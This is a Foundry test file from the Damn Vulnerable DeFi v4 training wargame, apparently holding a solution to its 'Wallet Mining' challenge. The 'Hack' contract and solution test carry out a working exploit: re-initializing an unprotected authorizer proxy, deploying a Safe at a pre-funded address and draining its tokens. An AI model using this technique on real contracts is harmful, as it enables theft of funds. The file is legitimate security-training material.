// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS =
        0xF8328bcAB198A23488Ea526bf56560705C4e423a;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    address constant SAFE_SINGLETON_FACTORY_ADDRESS =
        0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7;
    bytes constant SAFE_SINGLETON_FACTORY_CODE =
        hex"7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe03601600081602082378035828234f58015156039578182fd5b8082525050506014600cf3";

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerFactory authorizerFactory = new AuthorizerFactory();
        authorizer = AuthorizerUpgradeable(
            authorizerFactory.deployWithProxy(wards, aims, upgrader)
        );

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Include Safe singleton factory in this chain
        vm.etch(SAFE_SINGLETON_FACTORY_ADDRESS, SAFE_SINGLETON_FACTORY_CODE);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) = address(
            SAFE_SINGLETON_FACTORY_ADDRESS
        ).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) = address(SAFE_SINGLETON_FACTORY_ADDRESS).call(
            bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode)
        );
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = new WalletDeployer(
            address(token),
            address(proxyFactory),
            address(singletonCopy)
        );

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(
            address(walletDeployer),
            initialWalletDeployerTokenBalance
        );

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(
            TransparentProxy(payable(address(authorizer))).upgrader(),
            upgrader
        );
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(
            address(walletDeployer.cook()).code,
            type(SafeProxyFactory).runtimeCode,
            "bad cook code"
        );
        assertEq(
            walletDeployer.cpy().code,
            type(Safe).runtimeCode,
            "no copy code"
        );

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(
            token.balanceOf(address(walletDeployer)),
            initialWalletDeployerTokenBalance
        );
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        Enum.Operation operation = Enum.Operation.Call;
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
            userPrivateKey,
            keccak256(
                hex"1901ab44818b21f3d7aae496f701d747e76f4a7a4e9aef48eefcf9f7289e3c080b5ed1fec887a43aabf6d2c9c81d3322b11e4eb97b080f85123f60f96ead78092611"
            )
        );
        bytes memory sig = abi.encodePacked(r, s, v);
        bytes memory final_call_data_to_avoid_too_deep = abi.encodeCall(
            Safe.execTransaction,
            (
                address(token),
                0,
                abi.encodeWithSignature(
                    "transfer(address,uint256)",
                    user,
                    20_000_000e18
                ),
                operation,
                0,
                0,
                0,
                address(0),
                payable(0),
                sig
            )
        );
        Hack hack = new Hack(
            walletDeployer,
            token,
            authorizer,
            user,
            ward,
            USER_DEPOSIT_ADDRESS,
            final_call_data_to_avoid_too_deep
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(
            address(walletDeployer.cook()).code.length,
            0,
            "No code at factory address"
        );

        // Safe copy account must have code
        assertNotEq(
            walletDeployer.cpy().code.length,
            0,
            "No code at copy address"
        );

        // Deposit account must have code
        assertNotEq(
            USER_DEPOSIT_ADDRESS.code.length,
            0,
            "No code at user's deposit address"
        );

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(
            token.balanceOf(USER_DEPOSIT_ADDRESS),
            0,
            "User's deposit address still has tokens"
        );
        assertEq(
            token.balanceOf(address(walletDeployer)),
            0,
            "Wallet deployer contract still has tokens"
        );

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(
            token.balanceOf(user),
            DEPOSIT_TOKEN_AMOUNT,
            "Not enough tokens in user's account"
        );

        // Player sent payment to ward
        assertEq(
            token.balanceOf(ward),
            initialWalletDeployerTokenBalance,
            "Not enough tokens in ward's account"
        );
    }
}

contract Hack {
    constructor(
        WalletDeployer walletDeployer,
        DamnValuableToken token,
        AuthorizerUpgradeable authorizer,
        address user,
        address ward,
        address USER_DEPOSIT_ADDRESS,
        bytes memory final_call_data_to_avoid_too_deep
    ) {
        address[] memory owners = new address[](1);
        owners[0] = user;
        bytes memory initializer = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners,
            1,
            address(0),
            "",
            address(0),
            address(0),
            0,
            address(0)
        );
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        authorizer.init(wards, aims);
        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, 3);
        Enum.Operation operation = Enum.Operation.Call;
        token.transfer(ward, 1 ether);
        USER_DEPOSIT_ADDRESS.call(final_call_data_to_avoid_too_deep);
    }
}
